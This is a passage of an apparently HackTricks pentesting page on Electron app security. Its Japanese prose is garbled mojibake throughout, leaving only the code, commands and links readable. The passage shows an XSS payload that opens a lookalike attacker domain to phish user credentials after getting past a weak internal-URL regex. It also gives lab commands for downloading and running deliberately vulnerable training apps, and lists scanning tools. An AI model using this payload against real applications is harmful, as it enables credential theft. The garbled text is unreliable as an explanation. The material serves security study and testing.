## **å†…éƒ¨URLæ­£è¦è¡¨ç¾ãƒã‚¤ãƒ‘ã‚¹ã«ã‚ˆã‚‹XSSãƒ•ã‚£ãƒƒã‚·ãƒ³ã‚°**

XSSã‚’è¦‹ã¤ã‘ãŸãŒã€**RCEã‚’ãƒˆãƒªã‚¬ãƒ¼ã™ã‚‹ã“ã¨ãŒã§ããšã€å†…éƒ¨ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ç›—ã‚€ã“ã¨ã‚‚ã§ããªã„**å ´åˆã€ãã‚Œã‚’ä½¿ç”¨ã—ã¦**ãƒ•ã‚£ãƒƒã‚·ãƒ³ã‚°ã‚’ä»‹ã—ã¦è³‡æ ¼æƒ…å ±ã‚’ç›—ã‚€**ã“ã¨ã‚’è©¦ã™ã“ã¨ãŒã§ãã¾ã™ã€‚

ã¾ãšã€æ–°ã—ã„URLã‚’é–‹ã“ã†ã¨ã™ã‚‹ã¨ä½•ãŒèµ·ã“ã‚‹ã‹ã‚’çŸ¥ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ãƒ•ãƒ­ãƒ³ãƒˆã‚¨ãƒ³ãƒ‰ã®JSã‚³ãƒ¼ãƒ‰ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„:
```javascript
webContents.on("new-window", function (event, url, disposition, options) {} // opens the custom openInternally function (it is declared below)
webContents.on("will-navigate", function (event, url) {}                    // opens the custom openInternally function (it is declared below)
```
**`openInternally`**ã®å‘¼ã³å‡ºã—ã¯ã€ãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ã«å±ã™ã‚‹ãƒªãƒ³ã‚¯ã§ã‚ã‚‹ãŸã‚ã€**ãƒ‡ã‚¹ã‚¯ãƒˆãƒƒãƒ—ã‚¦ã‚£ãƒ³ãƒ‰ã‚¦**ã§é–‹ã‹ã‚Œã‚‹ã‹ã€**ã‚µãƒ¼ãƒ‰ãƒ‘ãƒ¼ãƒ†ã‚£ã®ãƒªã‚½ãƒ¼ã‚¹ã¨ã—ã¦ãƒ–ãƒ©ã‚¦ã‚¶ã§é–‹ã‹ã‚Œã‚‹ã‹**ã‚’æ±ºå®šã—ã¾ã™ã€‚

é–¢æ•°ã§ä½¿ç”¨ã•ã‚Œã‚‹**æ­£è¦è¡¨ç¾**ãŒ**ãƒã‚¤ãƒ‘ã‚¹ã«å¯¾ã—ã¦è„†å¼±**ã§ã‚ã‚‹å ´åˆï¼ˆãŸã¨ãˆã°ã€ã‚µãƒ–ãƒ‰ãƒ¡ã‚¤ãƒ³ã®ãƒ‰ãƒƒãƒˆã‚’ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—ã—ãªã„å ´åˆãªã©ï¼‰ã€æ”»æ’ƒè€…ã¯XSSã‚’æ‚ªç”¨ã—ã¦ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«å¯¾ã—ã¦è³‡æ ¼æƒ…å ±ã‚’è¦æ±‚ã™ã‚‹ãŸã‚ã®**æ”»æ’ƒè€…ã®ã‚¤ãƒ³ãƒ•ãƒ©ã‚¹ãƒˆãƒ©ã‚¯ãƒãƒ£ã«ä½ç½®ã™ã‚‹æ–°ã—ã„ã‚¦ã‚£ãƒ³ãƒ‰ã‚¦**ã‚’é–‹ãã“ã¨ãŒã§ãã¾ã™ã€‚
```html
<script>
window.open("<http://subdomainagoogleq.com/index.html>")
</script>
```
## **ãƒ„ãƒ¼ãƒ«**

* [**Electronegativity**](https://github.com/doyensec/electronegativity)ã¯ã€Electronãƒ™ãƒ¼ã‚¹ã®ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã§ã®è¨­å®šãƒŸã‚¹ã¨ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã®ã‚¢ãƒ³ãƒãƒ‘ã‚¿ãƒ¼ãƒ³ã‚’ç‰¹å®šã™ã‚‹ãŸã‚ã®ãƒ„ãƒ¼ãƒ«ã§ã™ã€‚
* [**Electrolint**](https://github.com/ksdmitrieva/electrolint)ã¯ã€Electronã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ç”¨ã®ã‚ªãƒ¼ãƒ—ãƒ³ã‚½ãƒ¼ã‚¹ã®VS Codeãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã§ã€Electronegativityã‚’ä½¿ç”¨ã—ã¾ã™ã€‚
* [**nodejsscan**](https://github.com/ajinabraham/nodejsscan)ã¯ã€è„†å¼±ãªã‚µãƒ¼ãƒ‰ãƒ‘ãƒ¼ãƒ†ã‚£ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚’ãƒã‚§ãƒƒã‚¯ã™ã‚‹ãŸã‚ã®ãƒ„ãƒ¼ãƒ«ã§ã™ã€‚
* [**Electro.ng**](https://electro.ng/)ï¼šè³¼å…¥ãŒå¿…è¦ã§ã™

## ãƒ©ãƒœ

[https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s)ã«ã¯ã€è„†å¼±ãªElectronã‚¢ãƒ—ãƒªã‚’æ‚ªç”¨ã™ã‚‹ãŸã‚ã®ãƒ©ãƒœãŒã‚ã‚Šã¾ã™ã€‚

ãƒ©ãƒœã‚’é€²ã‚ã‚‹ã®ã«å½¹ç«‹ã¤ã„ãã¤ã‹ã®ã‚³ãƒãƒ³ãƒ‰:
```bash
# Download apps from these URls
# Vuln to nodeIntegration
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable1.zip
# Vuln to contextIsolation via preload script
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable2.zip
# Vuln to IPC Rce
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable3.zip

# Get inside the electron app and check for vulnerabilities
npm audit

# How to use electronegativity
npm install @doyensec/electronegativity -g
electronegativity -i vulnerable1

# Run an application from source code
npm install -g electron
cd vulnerable1
npm install
npm start
```
## **å‚è€ƒæ–‡çŒ®**

* [https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028](https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028)
* [https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d](https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d)
* [https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8)
* [https://www.youtube.com/watch?v=a-YnG3Mx-Tg](https://www.youtube.com/watch?v=a-YnG3Mx-Tg)
* [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s)
* Electronã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã«é–¢ã™ã‚‹ã•ã‚‰ãªã‚‹ç ”ç©¶ã¨è§£èª¬ã¯[https://github.com/doyensec/awesome-electronjs-hacking](https://github.com/doyensec/awesome-electronjs-hacking)ã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚
* [https://www.youtube.com/watch?v=Tzo8ucHA5xw\&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq\&index=81](https://www.youtube.com/watch?v=Tzo8ucHA5xw\&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq\&index=81)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ã”è¦§ãã ã•ã„ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚
* [**å…¬å¼ã®PEASSï¼†HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter**ã§ç§ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€PRã‚’** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ã¨** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ã«æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
